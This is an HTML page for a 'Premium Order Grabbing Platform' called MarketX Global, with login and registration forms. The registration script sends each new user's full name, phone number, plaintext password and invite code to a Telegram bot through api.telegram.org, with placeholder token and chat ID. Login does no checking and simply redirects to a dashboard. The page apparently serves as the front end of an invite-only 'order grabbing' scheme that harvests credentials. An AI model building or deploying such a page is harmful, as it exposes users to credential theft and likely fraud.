<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global MarketX | Professional E-Commerce</title>
    <style>
        :root { --gold: #d4af37; --dark: #090909; --accent: #ffd700; }
        body { font-family: 'Poppins', sans-serif; margin: 0; background: #000; color: white; }
        
        /* Premium Ad Slider */
        .ad-container { height: 280px; position: relative; overflow: hidden; }
        .ad-slide { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
        .welcome-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
                           background: linear-gradient(to bottom, transparent, #000); }
        .welcome-text { position: absolute; bottom: 30px; left: 20px; }

        /* Professional Form */
        .form-section { padding: 40px 25px; background: #111; border-radius: 35px 35px 0 0; margin-top: -35px; position: relative; }
        .tabs { display: flex; justify-content: space-around; margin-bottom: 30px; }
        .tab { font-size: 18px; font-weight: 600; color: #555; cursor: pointer; transition: 0.3s; }
        .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 5px; }

        input { width: 100%; padding: 15px; margin: 12px 0; background: #1a1a1a; border: 1px solid #333; 
                border-radius: 12px; color: white; font-size: 15px; outline: none; }
        input:focus { border-color: var(--accent); }

        .btn-action { width: 100%; padding: 16px; background: var(--accent); color: black; border: none; 
                      border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
        
        #register-form { display: none; }
    </style>
</head>
<body>

    <div class="ad-container">
        <img src="https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=800" class="ad-slide">
        <div class="welcome-overlay"></div>
        <div class="welcome-text">
            <h1 style="margin:0; font-size: 28px; color: var(--accent);">MARKETX GLOBAL</h1>
            <p style="margin:5px 0; opacity: 0.8;">Premium Order Grabbing Platform</p>
        </div>
    </div>

    <div class="form-section">
        <div class="tabs">
            <span class="tab active" id="l-tab" onclick="toggleForm('login')">LOGIN</span>
            <span class="tab" id="r-tab" onclick="toggleForm('register')">REGISTER</span>
        </div>

        <div id="login-form">
            <input type="text" id="l-phone" placeholder="Phone Number">
            <input type="password" id="l-pass" placeholder="Password">
            <button class="btn-action" onclick="processLogin()">SIGN IN</button>
        </div>

        <div id="register-form">
            <input type="text" id="r-name" placeholder="Full Name">
            <input type="text" id="r-phone" placeholder="Phone Number">
            <input type="password" id="r-pass" placeholder="Create Password">
            <input type="text" id="r-invite" placeholder="Invitation Code (Required)">
            <button class="btn-action" onclick="processRegister()">CREATE ACCOUNT</button>
        </div>
    </div>

    <script>
        function toggleForm(type) {
            document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
            document.getElementById('register-form').style.display = type === 'register' ? 'block' : 'none';
            document.getElementById('l-tab').classList.toggle('active', type === 'login');
            document.getElementById('r-tab').classList.toggle('active', type === 'register');
        }

        function processRegister() {
            const name = document.getElementById('r-name').value;
            const phone = document.getElementById('r-phone').value;
            const pass = document.getElementById('r-pass').value;
            const invite = document.getElementById('r-invite').value;

            if(!name || !phone || !pass || !invite) {
                alert("Please fill all fields!");
                return;
            }

            // Telegram Notification
            const token = "YOUR_BOT_TOKEN";
            const chat_id = "YOUR_CHAT_ID";
            const msg = `New User Alert!\nName: ${name}\nPhone: ${phone}\nPass: ${pass}\nInvite: ${invite}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                alert("Registration Submitted! Please wait for Admin approval.");
                toggleForm('login');
            });
        }

        function processLogin() {
            // Dashboard သို့ တိုက်ရိုက်သွားရန် (အဆင့် ၂ တွင် Database နှင့် ချိတ်ပါမည်)
            window.location.href = "dashboard.html";
        }
    </script>
</body>
